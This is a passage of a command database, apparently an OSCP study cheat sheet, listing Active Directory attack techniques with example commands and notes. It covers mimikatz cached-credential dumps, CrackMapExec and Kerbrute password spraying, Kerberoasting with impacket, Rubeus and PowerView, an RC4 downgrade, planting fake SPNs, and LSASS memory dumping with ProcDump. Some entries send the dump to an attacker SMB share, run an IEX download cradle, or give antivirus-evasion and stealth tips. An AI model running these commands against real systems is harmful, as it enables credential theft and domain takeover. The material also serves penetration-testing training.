- Historical analysis: Identify privileged user patterns (DA logging into workstations)","medium","","","","{""No cache available / No cached credentials"": ""No domain credentials cached on system. Causes: (1) Cached logons disabled via GPO (CachedLogonsCount = 0). Check: reg query \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" /v CachedLogonsCount. (2) System never joined to domain (workgroup system). (3) No domain users have logged in interactively (only local accounts used). (4) Cache cleared by admin or policy. Solution: This is normal for workgroup systems or servers where domain users don't log in interactively. Focus on SAM/LSA Secrets instead."", ""Cannot access SECURITY hive"": ""Same as lsadump::secrets - SECURITY hive requires SYSTEM token. Solution: Verify 'token::elevate' succeeded. Alternative: Offline extraction: reg save HKLM\\SECURITY security.save && reg save HKLM\\SYSTEM system.save. Parse with: mimikatz 'lsadump::cache /security:security.save /system:system.save' OR impacket-secretsdump."", ""Only 1-2 cached credentials shown (expected 10)"": ""Fewer than 10 domain users have logged in, or CachedLogonsCount set lower than default. Explanation: Windows only caches credentials for users who have actually logged in interactively. If only 2 domain users ever logged in, only 2 credentials cached. Check configuration: reg query Winlogon /v CachedLogonsCount (shows max, not actual count)."", ""Want to crack MS-Cache v2 hash"": ""Cracking DCC2 much slower than NTLM (10240 iterations). Tools: (1) Hashcat: hashcat -m 2100 -a 0 mscache.txt rockyou.txt (mode 2100 = MS-Cache v2). (2) John: john --format=mscash2 mscache.txt --wordlist=rockyou.txt. Hash format for Hashcat: $DCC2$10240#username#hash (Mimikatz output needs formatting). TIME ESTIMATE: ~10-100x slower than NTLM cracking due to iterations. Weak passwords (Password1!) crack in seconds-minutes, strong passwords may be infeasible.""}","{""lsadump::cache"": ""Dumps cached domain credentials (MS-Cache v2 / DCC2) from registry. WHY CACHED CREDENTIALS EXIST: Domain-joined Windows systems cache domain user credentials locally to enable login when domain controller is unreachable (laptop offline, network down, DC maintenance). By default, Windows caches last 10 domain logons. STORED LOCATION: HKLM\\SECURITY\\Cache registry hive, encrypted with LSA boot key. HASH FORMAT: MS-Cache v2 (DCC2) = PBKDF2-HMAC-SHA1 with 10240 iterations + username + domain. CANNOT PASS-THE-HASH: Unlike NTLM, MS-Cache hashes are for verification only (offline logon), not network authentication. Must crack hash to obtain plaintext password."", ""token::elevate"": ""Elevates to SYSTEM token. REQUIRED: SECURITY registry hive containing cached credentials is SYSTEM-only accessible. Same privilege requirements as lsadump::secrets. Must run 'privilege::debug' first."", ""MS-Cache v2 (DCC2) Format"": ""Hash format: Username:Hash (no domain in hash, domain stored separately). Hash structure: PBKDF2-HMAC-SHA1(10240, UTF-16-LE(Username), MD4(MD4(Password))). Includes: Username in UTF-16 Little Endian format (case-sensitive) + Domain name + Iteration count 10240. Hashcat mode 2100 for cracking. MUCH SLOWER to crack than NTLM due to 10240 iterations (designed to resist brute force)."", ""Cached Credential Limitations"": ""Windows caches credentials for OFFLINE LOGON only, not network authentication. Limitations: (1) Cannot Pass-the-Hash with cached credentials (offline verification only). (2) Must crack hash to obtain plaintext password. (3) Only interactive logons cached (not service accounts or scheduled tasks). (4) Default limit: 10 cached credentials (configurable via GPO). (5) No cached credentials for local accounts (domain accounts only)."", ""Cache Configuration"": ""Default: 10 cached logons (CachedLogonsCount = 10). GPO: Computer Configuration \u2192 Windows Settings \u2192 Security Settings \u2192 Local Policies \u2192 Security Options \u2192 'Interactive logon: Number of previous logons to cache'. Value 0 = disabled (no cache), 1-50 = number of credentials to cache. Check current setting: reg query \""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"" /v CachedLogonsCount. Highly secure environments may disable caching (value 0).""}","","","[""hashcat-crack-mscache2"", ""mimikatz-lsadump-sam"", ""mimikatz-lsadump-secrets""]"
"crackmapexec-validate-admin","CrackMapExec - Validate Credentials and Admin Rights","enumeration","crackmapexec smb <TARGET> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>","Validate domain credentials and check for local administrator privileges on target systems.
Pwn3d! indicator shows which systems grant local admin access.","active-directory","crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com","CRITICAL OSCP skill:
Validate credentials and identify local admin rights in one command.

PWND INDICATOR:
Pwn3d! means user has LOCAL ADMINISTRATOR privileges on the target system = full system compromise possible.

Output examples:
[+] corp.com\dave:Flowers1 = Valid credentials but NOT admin.

[+] corp.com\dave:Flowers1 (Pwn3d!) = Valid credentials AND local admin.

WHY THIS WORKS:
CrackMapExec authenticates via SMB and attempts to access ADMIN$ share or perform privileged operations.

If successful, user is local admin.

NOISE LEVEL:
Low for single validation check.

TIME ESTIMATE:
2-5 seconds per host.

SUBNET SCANNING:
Use CIDR notation to find systems where user is admin:
crackmapexec smb 192.168.50.0/24 -u dave -p 'Flowers1' -d corp.com.

This scans entire subnet and shows which systems display Pwn3d! OSCP TIP:
After password spraying, immediately validate found credentials to identify admin access.

Local admin on one workstation can lead to lateral movement and domain admin compromise.

BONUS:
Add --shares flag to see accessible shares, --sam to dump local password hashes (requires Pwn3d!), --lsa to dump cached domain credentials (requires Pwn3d!).

Example full validation:
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' -d <DOMAIN> --shares --sam --lsa","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Verify username and password are correct. Check for typos."", ""STATUS_ACCESS_DENIED"": ""Valid credentials but access denied. User may be restricted or disabled."", ""[+] but no Pwn3d!"": ""Valid credentials but NOT local admin on this system. Try other systems in subnet: crackmapexec smb 192.168.50.0/24 -u <USER> -p '<PASS>' -d <DOMAIN>""}","{""smb"": ""Use SMB protocol for validation"", ""-u"": ""Username to test"", ""-p"": ""Password to test"", ""-d"": ""Domain name for domain authentication"", ""--shares"": ""Enumerate accessible shares after successful authentication"", ""--sam"": ""Dump SAM database if local admin (requires Pwn3d!)"", ""--lsa"": ""Dump LSA secrets if local admin (requires Pwn3d!)""}","","[""kerbrute-validate-creds"", ""pth-evil-winrm"", ""ftp-connect""]","[""psexec-impacket-shell"", ""smbexec-impacket-fileless"", ""wmiexec-shell"", ""secretsdump-hashes"", ""crackmapexec-sam-dump""]"
"kerbrute-validate-creds","Kerbrute - Quick Credential Validation","enumeration","kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> <USERFILE> '<PASSWORD>'","Rapidly validate domain credentials via Kerberos pre-authentication.
No full login required - minimal network footprint with just 2 UDP packets.","active-directory","kerbrute passwordspray -d corp.com --dc 192.168.50.70 single_user.txt 'Nexus123!'","FASTEST way to validate domain credentials without full authentication.

Uses Kerberos AS-REQ to test if credentials are valid.

ONLY 2 UDP PACKETS - stealthier than SMB/RDP login attempts.

NOISE LEVEL:
Minimal - only generates Event ID 4768 (TGT request) for valid creds or Event ID 4771 (pre-auth failed) for invalid.

SPEED:
<1 second for single validation.

LIMITATION:
Only validates credentials are correct, does NOT check admin rights (use crackmapexec-validate-admin for that).

WHY THIS WORKS:
Kerberos pre-authentication requires encrypted timestamp using user's password hash.

If credentials valid, KDC issues TGT.

If invalid, KDC returns pre-auth error.

TIME ESTIMATE:
<5 seconds.

USE CASES:
(1) Quick validation of credentials found during engagement.

(2) Batch validation of multiple username:password pairs.

(3) Pre-check before attempting noisy SMB/RDP login.

OSCP TIP:
Use this for QUICK validation (""are these creds valid?""), then use crackmapexec-validate-admin to check if user is local admin somewhere.

Kerbrute doesn't show admin rights, only credential validity.

For single user validation, create file:
echo 'pete' > user.txt && kerbrute passwordspray -d corp.com --dc 192.168.50.70 user.txt 'Nexus123!'","high","","","","{""Couldn't find any KDCs"": ""DC IP incorrect or port 88 blocked. Verify: sudo nmap -p 88 -Pn -sU -v <DC_IP>"", ""0 successes"": ""Invalid credentials. Verify username and password are correct."", ""Need to create single user file"": ""Create file: echo 'username' > single_user.txt""}","{""passwordspray"": ""Password spraying mode (also works for single user validation)"", ""-d"": ""Domain name (FQDN)"", ""--dc"": ""Domain controller IP address""}","","[""crackmapexec-validate-admin"", ""ftp-connect"", ""pth-evil-winrm""]","[""crackmapexec-validate-admin"", ""pth-evil-winrm"", ""ftp-connect""]"
"cme-smb-auth-test","CrackMapExec SMB Authentication Test","enumeration","crackmapexec smb <TARGET> -u <USER> -p '<PASS>'","Test SMB authentication with credentials. Look for Pwn3d! indicator for local admin access.","active-directory","crackmapexec smb 192.168.50.70 -u Administrator -p 'Password123!'","[+] = valid creds, (Pwn3d!) = local admin. Use -H for hash. Add -d for domain auth.","high","","","","","{""smb"": ""Use SMB protocol"", ""-u"": ""Username"", ""-p"": ""Password"", ""-d"": ""Domain (optional)"", ""-H"": ""NTLM hash instead of password""}","","",""
"impacket-getuserspns-kerberoast","impacket-GetUserSPNs - Kerberoasting Attack","password-attacks","impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:""<PASSWORD>""","Request and extract TGS-REP hashes for service accounts (Kerberoasting)","active-directory","impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/meg:""VimForPowerShell123!""","KERBEROASTING extracts TGS-REP hashes from service accounts.

WHY THIS WORKS:
Any authenticated domain user can request TGS (service ticket) for ANY SPN in the domain.

The TGS is encrypted with the service account's password hash.

No permission checks at TGS request time - checks only happen when accessing the actual service.

This allows offline hash cracking.

TARGET ACCOUNTS:
Service accounts with SPNs (SQL Server, IIS, custom services).

CRITICAL DISTINCTION:
Computer accounts (MACHINE$) and Managed Service Accounts (MSAs) use 120-character random passwords - effectively uncrackable.

Focus on USER accounts with SPNs (iis_service, sql_service, etc.).

HASH FORMAT:
Output is $krb5tgs$23$ (Kerberos 5 TGS-REP etype 23 = RC4-HMAC).

Use Hashcat mode 13100.

RC4 VS AES:
Accounts with 'msDS-SupportedEncryptionTypes' attribute set to AES will return AES-encrypted tickets (harder to crack).

Use Rubeus with /tgtdeleg flag to force RC4 (see rubeus-kerberoast-aes).

OSCP TIP:
Kerberoasting is HIGH-PRIORITY attack - fast to execute (30 seconds), often successful (weak service account passwords common), and requires only domain user credentials.

TIME ESTIMATE:
10-30 seconds for hash extraction + 1-120 minutes for cracking (depends on password).

DETECTION:
Event ID 4769 (TGS request) - normal Kerberos traffic, difficult to distinguish from legitimate service access.

STEALTH:
Very low detection risk.

OUTPUT ANALYSIS:
Look for accounts in privileged groups (memberof column).

Service accounts are often over-privileged (Domain Admins, local admins on multiple systems).

Clock sync is CRITICAL - use ntpdate or rdate if KRB_AP_ERR_SKEW errors occur.","high","","","","{""KRB_AP_ERR_SKEW(Clock skew too great)"": ""Time sync issue. Solution: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>. Kerberos requires <5 minute time difference."", ""No entries found"": ""No SPNs linked to user accounts (only computer accounts found). Computer/MSA accounts have 120-character random passwords (uncrackable). This is common - not all domains have service accounts with SPNs."", ""[-] CCache file is not found"": ""Normal warning - can be ignored. Use -save flag only if you need .ccache files for ticket injection.""}","{""-request"": ""Request TGS tickets - Automatically request service tickets for all discovered SPNs and extract hashes"", ""-dc-ip"": ""Domain controller IP"", ""-outputfile"": ""Save hashes to file - Syntax: -outputfile hashes.kerberoast (Hashcat mode 13100 format)"", ""-save"": ""Save TGS tickets to .ccache files for later use"", ""Password"": ""Domain user password (prompted if not provided in command)""}","","[""rubeus-kerberoast"", ""powerview-kerberoast""]","[""hashcat-crack-tgsrep""]"
"impacket-getuserspns-list","impacket-GetUserSPNs - List SPNs Only","enumeration","impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:""<PASSWORD>""","Enumerate service principal names without requesting TGS tickets","active-directory","impacket-GetUserSPNs -dc-ip 192.168.50.70 corp.com/meg:""VimForPowerShell123!""","SPN ENUMERATION ONLY - lists service accounts without extracting hashes.

Use this for:
(1) Reconnaissance before Kerberoasting.

(2) Identifying high-value targets.

(3) Checking if Kerberoasting is viable.

OUTPUT COLUMNS:
ServicePrincipalName (service type and hostname), Name (account name), MemberOf (group membership - look for admin groups), PasswordLastSet (old = weak password likely), LastLogon (active account check).

SPN FORMAT:
protocol/hostname:port (e.g., HTTP/web04.corp.com:80, MSSQLSvc/sql01.corp.com:1433).

TARGET SELECTION:
Prioritize accounts with:
(1) Old PasswordLastSet dates (>1 year = weak password likely).

(2) Privileged group membership (Domain Admins, Enterprise Admins).

(3) Generic service names (sql_service, iis_service often have weak passwords like 'Password1!').

COMPUTER ACCOUNTS:
Ignore SPNs registered to computer accounts (ending in $) - these have 120-character random passwords.

OSCP STRATEGY:
Run enumeration FIRST to identify targets, then use -request flag for hash extraction.

TIME ESTIMATE:
<5 seconds.

NO HASH EXTRACTION:
Add -request flag to extract TGS-REP hashes (see impacket-getuserspns-kerberoast).

DETECTION:
Minimal - standard LDAP queries for SPN attribute, Event ID 4662 (directory service access).","high","","","","{""No entries found"": ""No SPNs registered to user accounts. Common - many domains only use computer accounts for services (120-char passwords, uncrackable)."", ""Clock skew error"": ""Time sync required: sudo ntpdate <DC_IP>""}","{""-dc-ip"": ""Domain controller IP"", ""Password"": ""Domain user password (prompted)""}","","[""setspn-list-user-spns""]","[""impacket-getuserspns-kerberoast"", ""rubeus-kerberoast""]"
"rubeus-kerberoast","Rubeus - Kerberoasting (Windows)","password-attacks",".\Rubeus.exe kerberoast /outfile:<OUTPUT_FILE>","Extract TGS-REP hashes from Windows using Rubeus","active-directory",".\Rubeus.exe kerberoast /outfile:C:\Tools\hashes.kerberoast","WINDOWS-BASED KERBEROASTING using Rubeus.exe.

ADVANTAGES OVER IMPACKET:
(1) No credentials needed (uses current user context).

(2) Faster from Windows (native Kerberos API).

(3) No time sync issues.

(4) Auto-discovers SPNs.

EXECUTION CONTEXT:
Run from domain-joined Windows system OR use runas /netonly.

TOOL LOCATION:
C:\Tools\Rubeus.exe on OSCP lab systems.

Download:
https://github.com/GhostPack/Rubeus.

HASH OUTPUT:
Hashcat mode 13100 compatible by default.

AES VS RC4:
Modern domains return AES-encrypted tickets (Supported ETypes:
RC4_HMAC_DEFAULT vs AES256_CTS_HMAC_SHA1_96).

AES is stronger and slower to crack.

Use /tgtdeleg flag to force RC4 downgrade (see rubeus-kerberoast-aes).

OSCP TIP:
Rubeus preferred when you have RDP/WinRM access to Windows.

No credentials needed, no time sync.

OUTPUT ANALYSIS:
Look for 'Supported ETypes:
RC4_HMAC_DEFAULT' (easier to crack) vs AES (harder).

Target RC4 accounts first.

TIME ESTIMATE:
10-30 seconds for hash extraction.

AV EVASION:
Rubeus flagged by Windows Defender.

Options:
(1) Disable AV.

(2) Obfuscated version.

(3) Reflective loading.

(4) Fall back to impacket from Linux.

MULTIPLE ACCOUNTS:
Rubeus automatically finds ALL SPNs linked to user accounts and extracts hashes sequentially.

Hash saved to /outfile path specified.

DETECTION:
Event ID 4769 (TGS request) - normal Kerberos traffic, low visibility.","high","","","","{""No users found"": ""No SPNs registered to user accounts. Common - focus on other attack vectors or enumerate with setspn -Q */* to verify."", ""Access denied"": ""Need domain user context. Run from domain-joined system as authenticated user OR use runas /netonly /user:<DOMAIN>\\<USER> cmd.exe"", ""Unhandled Rubeus exception"": ""AV detection or version incompatibility. Try: (1) Latest Rubeus release. (2) Obfuscated binary. (3) impacket-GetUserSPNs from Linux."", ""NOTICE: AES hashes will be returned"": ""See rubeus-kerberoast-aes for RC4 downgrade technique (/tgtdeleg flag).""}","{""kerberoast"": ""Kerberoasting mode - Request TGS tickets for all discovered SPNs and extract hashes"", ""/outfile"": ""Save hashes to file in Hashcat mode 13100 format"", ""/user"": ""Target specific user - Syntax: /user:iis_service"", ""/tgtdeleg"": ""Force RC4 encryption for AES-enabled accounts (see rubeus-kerberoast-aes)"", ""/nowrap"": ""Disable line wrapping (useful for copy-paste)"", ""/spn"": ""Target specific SPN - Syntax: /spn:HTTP/web04.corp.com"", ""/domain"": ""Specify domain - Auto-detected if omitted"", ""/dc"": ""Specify domain controller - Syntax: /dc:DC1.corp.com""}","","[""impacket-getuserspns-kerberoast"", ""powerview-kerberoast""]","[""hashcat-crack-tgsrep""]"
"rubeus-kerberoast-aes","Rubeus - Kerberoasting with RC4 Downgrade","password-attacks",".\Rubeus.exe kerberoast /tgtdeleg /outfile:<OUTPUT_FILE>","Force RC4 encryption for AES-enabled accounts using TGT delegation","active-directory",".\Rubeus.exe kerberoast /tgtdeleg /outfile:C:\Tools\hashes_rc4.kerberoast","RC4 DOWNGRADE TECHNIQUE for accounts configured to use AES encryption.

WHY THIS MATTERS:
AES-encrypted TGS tickets are SLOWER to crack than RC4 (10-100x slower depending on hardware).

Modern domains default to AES for stronger security.

RC4 is legacy but still supported for backward compatibility.

/tgtdeleg MECHANISM:
Requests TGT with constrained delegation flag, then uses that TGT to request TGS.

The delegation TGT forces RC4 encryption regardless of account's encryption type setting.

WHEN TO USE:
(1) Rubeus kerberoast shows 'Supported ETypes:
AES256_CTS_HMAC_SHA1_96'.

(2) You have limited time for cracking (OSCP exam).

(3) Weak password suspected (worth trying faster cracking method).

OSCP TIP:
Try /tgtdeleg FIRST to get RC4 hashes.

If it fails, fall back to standard kerberoasting with AES hashes.

TIME SAVINGS:
RC4 cracking is ~10x faster than AES.

Example:
rockyou.txt with rules takes 3 hours for RC4 vs 30+ hours for AES.

DETECTION:
Same as standard Kerberoasting - Event ID 4769 (TGS request).

TGT delegation adds Event ID 4768 (TGT request) but still normal Kerberos traffic.

HASH FORMAT:
Output is still Hashcat mode 13100 ($krb5tgs$23$ = etype 23 = RC4-HMAC).

AES would be mode 19600/19700.

LIMITATIONS:
Some hardened domains disable RC4 entirely (enforce AES-only).

In this case, /tgtdeleg will fail and you must crack AES hashes.

NOT ALWAYS NEEDED:
Check 'Supported ETypes' in standard Rubeus output.

If already RC4_HMAC_DEFAULT, no need for /tgtdeleg.","medium","","","","{""Still getting AES hashes"": ""TGT delegation failed. Domain may enforce AES-only (rare). Crack AES hash with Hashcat mode 19600/19700 (slower) OR focus on other accounts."", ""Unhandled exception"": ""TGT delegation not permitted for current user. Fall back to standard Rubeus kerberoast (accept AES encryption).""}","{""/tgtdeleg"": ""TGT delegation - Force RC4 encryption by requesting constrained delegation ticket first. Exploits unconstrained delegation to downgrade from AES to RC4 (weaker encryption, faster cracking)."", ""kerberoast"": ""Kerberoasting mode"", ""/outfile"": ""Save RC4-encrypted hashes to file""}","","[""rubeus-kerberoast""]","[""hashcat-crack-tgsrep""]"
"powerview-kerberoast","PowerView - Invoke-Kerberoast","password-attacks","Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash","Kerberoasting using PowerView PowerShell module","active-directory","","POWERVIEW-BASED KERBEROASTING.

ADVANTAGES:
(1) Pure PowerShell (no exe upload).

(2) Integrated with PowerView enumeration.

(3) Flexible output formats.

DISADVANTAGES:
(1) Slower than Rubeus.

(2) PowerView often flagged by AV.

(3) Requires PowerView import.

POWERVIEW LOCATION:
C:\Tools\PowerView.ps1 on lab systems OR download from PowerSploit.

IMPORT:
Import-Module .\PowerView.ps1 OR dot-source:
.

.\PowerView.ps1.

EXECUTION POLICY:
May need bypass:
powershell -ep bypass -c 'Import-Module .\PowerView.ps1; Invoke-Kerberoast -OutputFormat Hashcat'.

OUTPUT:
Default shows SamAccountName, ServicePrincipalName, Hash.

Use Select-Object -ExpandProperty Hash for hash-only output.

OSCP TIP:
Rubeus is generally preferred (faster, cleaner output).

Use PowerView when:
(1) Rubeus blocked by AV.

(2) Already using PowerView for other enumeration.

(3) Need PowerShell-only solution.

SAVE TO FILE:
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File hashes.txt.

TIME ESTIMATE:
30-60 seconds for hash extraction (slower than Rubeus).

DETECTION:
Event ID 4769 (TGS request) - normal Kerberos traffic.

PowerView import may trigger Event ID 4104 (PowerShell script block logging) if enabled.

ALTERNATIVE SYNTAX:
Get-DomainSPNTicket (older PowerView cmdlet, same functionality).","medium","","","","{""Invoke-Kerberoast not recognized"": ""PowerView not loaded. Import: Import-Module C:\\Tools\\PowerView.ps1 OR download: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"", ""No SPN found"": ""No user accounts with SPNs. Common - many domains use computer accounts only."", ""Access denied"": ""Need domain user context. Run from domain-joined system or use runas /netonly""}","{""-OutputFormat"": ""Hash format - Options: Hashcat (mode 13100), John. Use Hashcat for consistency."", ""-Identity"": ""Target specific user - Syntax: -Identity iis_service"", ""-Domain"": ""Specify domain - Auto-detected if omitted"", ""-Server"": ""Specify domain controller - Syntax: -Server DC1.corp.com"", ""Select-Object -ExpandProperty Hash"": ""Extract only hash string (removes metadata for cleaner output)""}","","[""rubeus-kerberoast"", ""impacket-getuserspns-kerberoast""]","[""hashcat-crack-tgsrep""]"
"setspn-list-user-spns","setspn - List Service Principal Names","enumeration","setspn -Q */*","Enumerate SPNs using Windows built-in setspn.exe","active-directory","","BUILT-IN SPN ENUMERATION using setspn.exe (no tools needed).

ADVANTAGES:
(1) Built into Windows (no upload).

(2) Legitimate admin tool (low suspicion).

(3) No AV flags.

(4) Works on very old Windows versions.

DISADVANTAGES:
(1) Shows ALL SPNs (computer + user accounts - requires manual filtering).

(2) No automatic hash extraction.

(3) Verbose output.

OUTPUT FORMAT:
Shows CN= (common name), servicePrincipalName, and DN (distinguished name).

FILTERING USER ACCOUNTS:
Look for CN= lines without $ (computer accounts end in $).

Example:
CN=iis_service vs CN=WEB01$ (computer).

COMMON SPN TYPES:
HTTP/ (web servers, IIS), MSSQLSvc/ (SQL Server), WSMAN/ (WinRM), HOST/ (multiple services), TERMSRV/ (RDP), RestrictedKrbHost/ (Kerberos-constrained delegation).

OSCP TIP:
Use setspn for initial reconnaissance when Rubeus/impacket unavailable.

Note user account SPNs, then use Rubeus/impacket for hash extraction.

MANUAL FILTERING:
setspn -Q */* | findstr /V '$' | findstr 'CN=' (remove computer accounts, show only CN lines).

TIME ESTIMATE:
5-15 seconds depending on domain size.

DETECTION:
Legitimate admin activity - Event ID 4662 (directory service access).

Very low suspicion.

ALTERNATIVE:
setspn -T corp.com -Q */* (specify domain explicitly).","medium","","","","{""No such SPN found"": ""No SPNs registered OR not enough permissions. Verify: setspn -Q */ (simplified query) or use domain admin account."", ""Access denied"": ""Need domain user privileges. Run from domain-joined system as authenticated user.""}","{""-Q"": ""Query - Search for SPNs matching pattern"", ""*/*"": ""Wildcard pattern - Match all SPNs (protocol/hostname format)"", ""-T"": ""Target domain - Syntax: -T corp.com (query specific domain)"", ""-F"": ""Forest - Query entire forest instead of single domain""}","","[""impacket-getuserspns-list""]","[""rubeus-kerberoast"", ""impacket-getuserspns-kerberoast""]"
"targeted-kerberoast-set","Targeted Kerberoasting - Set SPN on User Account","privilege-escalation","Set-DomainObject -Identity <USERNAME> -Set @{serviceprincipalname='HTTP/<HOSTNAME>'} -Verbose","Add service principal name to user account for targeted Kerberoasting (requires GenericWrite/GenericAll)","active-directory","Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='HTTP/fake.corp.com'} -Verbose","TARGETED KERBEROASTING attack for scenarios where no existing SPNs on user accounts.

REQUIREMENTS:
GenericWrite OR GenericAll permissions on target user.

ATTACK FLOW:
(1) Identify user you have write permissions on.

(2) Add fake SPN.

(3) Extract TGS hash with Rubeus/impacket.

(4) Crack hash offline.

(5) CLEANUP:
Remove SPN (CRITICAL - see targeted-kerberoast-cleanup).

SPN FORMAT:
protocol/hostname format (e.g., HTTP/fake.corp.com).

Hostname doesn't need to exist - AD doesn't validate.

Protocol can be any string.

ETHICAL NOTE:
Modifies production AD.

ALWAYS remove SPN after obtaining hash.

Document in assessment notes.

OSCP SCENARIO:
Common with delegated permissions, service account management, misconfigured ACLs.

PERMISSION CHECK:
Get-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (whoami /user)[1]} | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}.

TIME ESTIMATE:
5 seconds to add SPN + 10 seconds to extract hash + 1-120 minutes to crack.

DETECTION:
Event ID 4742 (computer account changed) or 4738 (user account changed) - shows servicePrincipalName modification.

SUSPICIOUS if arbitrary SPN added to standard user account.

CLEANUP CRITICAL:
Failing to remove SPN leaves permanent modification in AD.

Set reminder or use auto-cleanup script.

ALTERNATIVE:
Set-ADUser -Identity <USERNAME> -ServicePrincipalNames @{Add='HTTP/fake.corp.com'} (native AD PowerShell module, same result).

MULTIPLE SPNs:
User can have multiple SPNs.

Use -Append instead of -Set to add without removing existing SPNs (rare scenario).","medium","","","","{""Access denied"": ""Missing GenericWrite/GenericAll permissions. Verify: Get-DomainObjectAcl -Identity <USERNAME> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericWrite|GenericAll'}"", ""Set-DomainObject not recognized"": ""PowerView not loaded. Import: Import-Module .\\PowerView.ps1"", ""SPN already exists"": ""Account already has SPN OR duplicate SPN in domain. Use different protocol/hostname combination.""}","{""-Identity"": ""Target user account"", ""-Set"": ""Set attribute - Syntax: @{attributename='value'}. serviceprincipalname attribute takes SPN string."", ""-Verbose"": ""Show detailed output"", ""serviceprincipalname"": ""SPN attribute - Format: protocol/hostname (e.g., HTTP/fake.corp.com, MSSQLSvc/fake.corp.com:1433)""}","","","[""rubeus-kerberoast"", ""impacket-getuserspns-kerberoast"", ""targeted-kerberoast-cleanup""]"
"targeted-kerberoast-cleanup","Targeted Kerberoasting - Remove SPN (Cleanup)","utilities","Set-DomainObject -Identity <USERNAME> -Clear serviceprincipalname -Verbose","Remove service principal name added during targeted Kerberoasting attack","active-directory","Set-DomainObject -Identity targetuser -Clear serviceprincipalname -Verbose","CRITICAL CLEANUP STEP after targeted Kerberoasting.

-Clear OPERATION:
Removes ALL SPNs from account.

If account had legitimate SPNs before your attack, use -Set @{serviceprincipalname='original_spn'} instead of -Clear to restore original.

VERIFICATION:
Get-DomainUser -Identity <USERNAME> -Properties serviceprincipalname.

Should show no serviceprincipalname attribute OR empty value.

OSCP REQUIREMENT:
Always document cleanup in assessment report.

Show before/after SPN values as evidence.

AUTOMATION:
Create cleanup script:
Start-Sleep -Seconds 1800; Set-DomainObject -Identity <USERNAME> -Clear serviceprincipalname (auto-cleanup after 30 min).

TIME TO CLEANUP:
<5 seconds.

WHY CLEANUP MATTERS:
(1) Ethical requirement - restore environment to original state.

(2) Detection - arbitrary SPNs on user accounts are suspicious.

(3) Functionality - fake SPNs may interfere with legitimate services.

FAILED CLEANUP:
If you lose access before cleanup, document in report and notify client immediately.

Provide manual steps:
Open ADUC  Find user  Properties  Attribute Editor  servicePrincipalName  Remove values.

VERIFICATION COMMAND:
(Get-DomainUser -Identity <USERNAME> -Properties serviceprincipalname).serviceprincipalname (should return $null or empty).

ALTERNATIVE:
Set-ADUser -Identity <USERNAME> -ServicePrincipalNames @{Remove='HTTP/fake.corp.com'} (removes specific SPN, preserves others if they exist).

RESTORE ORIGINAL:
If account had legitimate SPN before attack, use Get-DomainUser output from BEFORE attack to restore exact original value.","high","","","","{""Access denied"": ""Lost permissions or account locked. Escalate to domain admin or notify client."", ""How to verify SPN removed"": ""Get-DomainUser -Identity <USERNAME> -Properties serviceprincipalname | Select-Object serviceprincipalname. Should be empty/null.""}","{""-Identity"": ""Target user account"", ""-Clear"": ""Clear attribute - Removes all values from specified attribute"", ""-Verbose"": ""Confirm SPN removed"", ""serviceprincipalname"": ""Attribute to clear""}","[""targeted-kerberoast-set""]","",""
"ad-lsass-dump-procdump","Dump LSASS Memory with ProcDump","post-exploit","procdump.exe -accepteula -ma lsass.exe lsass.dmp","Create memory dump of LSASS process using Sysinternals ProcDump. Contains cleartext passwords, NTLM hashes, and Kerberos tickets for all logged-in users. Transfer to Kali for offline Mimikatz analysis.","credential-dumping","","PREFERRED LSASS dumping method when Mimikatz is blocked by AV. ProcDump is Microsoft-signed and legitimate admin tool - bypasses most AV. OSCP WORKFLOW: (1) Get SYSTEM shell (psexec -s -i cmd), (2) procdump lsass, (3) Transfer to Kali (SMB server or HTTP upload), (4) Run Mimikatz on Kali: mimikatz.exe 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords' exit. ADVANTAGES: No AV alerts, offline analysis (no LSASS manipulation on target), forensically cleaner. DISADVANTAGES: Large file transfer (40-200MB), requires stable shell for transfer. Time estimate: 10-30 seconds (dump) + 30-180 seconds (transfer depending on connection).

MANUAL ALTERNATIVES:

Find LSASS PID first (if antivirus monitors 'lsass.exe' string):
tasklist /fi ""imagename eq lsass.exe""
procdump.exe -accepteula -ma <PID> lsass.dmp

Dump with compression (smaller transfer):
procdump.exe -accepteula -ma lsass.exe lsass.dmp
powershell Compress-Archive -Path lsass.dmp -DestinationPath lsass.zip

Direct dump to SMB share (no local storage):
smbserver.py share /tmp/ (on Kali)
procdump.exe -accepteula -ma lsass.exe \\<LHOST>\share\lsass.dmp

Dump to temp directory (avoid permission issues):
procdump.exe -accepteula -ma lsass.exe %TEMP%\lsass.dmp
cd %TEMP% && copy lsass.dmp \\<LHOST>\share\

Process on Kali with Mimikatz (Windows binary via Wine):
wine mimikatz.exe ""sekurlsa::minidump lsass.dmp"" ""sekurlsa::logonpasswords"" ""exit"" > creds.txt

Process on Kali with pypykatz (Python alternative):
pypykatz lsa minidump lsass.dmp > creds.txt

WDigest cleartext password extraction:
# Windows 2008 R2 and earlier store cleartext passwords in LSASS (WDigest)
mimikatz.exe ""sekurlsa::minidump lsass.dmp"" ""sekurlsa::wdigest"" ""exit""

Kerberos ticket extraction:
mimikatz.exe ""sekurlsa::minidump lsass.dmp"" ""sekurlsa::tickets /export"" ""exit""

OPSEC CONSIDERATIONS:
- Event ID 10 (process access) logged when LSASS accessed
- Sysmon Event ID 10 (LSASS access) if Sysmon deployed
- Defenders monitor for: lsass.exe in command line, procdump.exe accessing lsass, large .dmp files in unusual locations
